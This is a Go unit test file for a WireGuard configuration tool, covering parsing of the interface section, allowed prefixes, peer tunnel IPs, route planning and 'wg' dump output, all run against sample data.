func TestInterfaceSectionAndValues(t *testing.T) {
	sec := interfaceSection(sampleConf)
	if !strings.Contains(sec, "ListenPort = 51820") || strings.Contains(sec, "PublicKey") {
		t.Fatalf("bad interface section: %q", sec)
	}
	peersOnly := strings.Replace(sampleConf, "10.99.1.11/32", "10.99.1.12/32", 1)
	if interfaceSection(peersOnly) != sec {
		t.Fatal("peer edit changed the interface section")
	}
	if interfaceSection(strings.Replace(sampleConf, "51820", "443", 1)) == sec {
		t.Fatal("port change not detected")
	}
	if listenPortOf(sampleConf) != 51820 {
		t.Fatalf("listen port: %d", listenPortOf(sampleConf))
	}
}

func TestAllowedPrefixesAndTunnelIPs(t *testing.T) {
	p := allowedPrefixes(sampleConf)
	for _, want := range []string{"10.99.0.2", "192.168.20.0/24", "10.99.1.10", "10.99.1.11"} {
		if !p[want] {
			t.Errorf("missing prefix %s in %v", want, p)
		}
	}
	if len(p) != 4 {
		t.Errorf("unexpected prefixes: %v", p)
	}
	ips := peerTunnelIPs(sampleConf)
	if ips["rjqlrC7N/QsK15DjL/JKh/5ezM35+ZP6mJH/jqO7bl4="] != "10.99.0.2" {
		t.Errorf("office tunnel ip: %v", ips)
	}
	if ips["HjlonIkFUXpUAi3WRfPd1XFHtdiGea8FAQIjkb3c1lA="] != "10.99.1.11" {
		t.Errorf("client tunnel ip: %v", ips)
	}
}

func TestRoutePlan(t *testing.T) {
	current := []ipRoute{
		{Dst: "10.99.0.0/24", Protocol: "kernel"}, // connected: covers the /32 tunnel addresses
		{Dst: "192.168.20.0/24", Protocol: "boot"},
		{Dst: "10.50.0.0/24", Protocol: "boot"}, // stale
		{Dst: "10.99.1.10", Protocol: "boot"},
	}
	desired := allowedPrefixes(sampleConf)
	add, del := routePlan(desired, current)
	if strings.Join(add, ",") != "10.99.1.11" {
		t.Errorf("add = %v", add)
	}
	if strings.Join(del, ",") != "10.50.0.0/24" {
		t.Errorf("del = %v", del)
	}
	// A desired prefix wider than the connected route is not "covered".
	add, _ = routePlan(map[string]bool{"10.99.0.0/16": true}, current)
	if strings.Join(add, ",") != "10.99.0.0/16" {
		t.Errorf("wider prefix should be added: %v", add)
	}
}

func TestParseRoutes(t *testing.T) {
	routes, err := parseRoutes(`[{"dst":"10.99.0.0/24","protocol":"kernel","scope":"link","prefsrc":"10.99.0.1","flags":[]},{"dst":"192.168.20.0/24","scope":"link","flags":[]}]`)
	if err != nil || len(routes) != 2 || routes[0].Protocol != "kernel" || routes[1].Dst != "192.168.20.0/24" {
		t.Fatalf("parse: %v %+v", err, routes)
	}
	if r, err := parseRoutes(""); err != nil || len(r) != 0 {
		t.Fatalf("empty: %v %v", err, r)
	}
}

func TestParseWgDump(t *testing.T) {
	dump := "privkey\tpubkey\t51820\toff\n" +
		"rjqlrC7N/QsK15DjL/JKh/5ezM35+ZP6mJH/jqO7bl4=\t(none)\t203.0.113.20:51820\t10.99.0.2/32,192.168.20.0/24\t1757000000\t12345\t67890\toff\n" +
		"HjlonIkFUXpUAi3WRfPd1XFHtdiGea8FAQIjkb3c1lA=\t(none)\t(none)\t10.99.1.11/32\t0\t0\t0\toff\n"
	peers := parseWgDump(dump)
	if len(peers) != 2 {
		t.Fatalf("peers: %+v", peers)
	}
	if peers[0].Endpoint != "203.0.113.20:51820" || peers[0].LatestHandshake != 1757000000 || peers[0].RxBytes != 12345 || peers[0].TxBytes != 67890 {
		t.Errorf("peer 0: %+v", peers[0])
	}
	if peers[1].Endpoint != "" || peers[1].LatestHandshake != 0 {
		t.Errorf("peer 1: %+v", peers[1])
	}
}

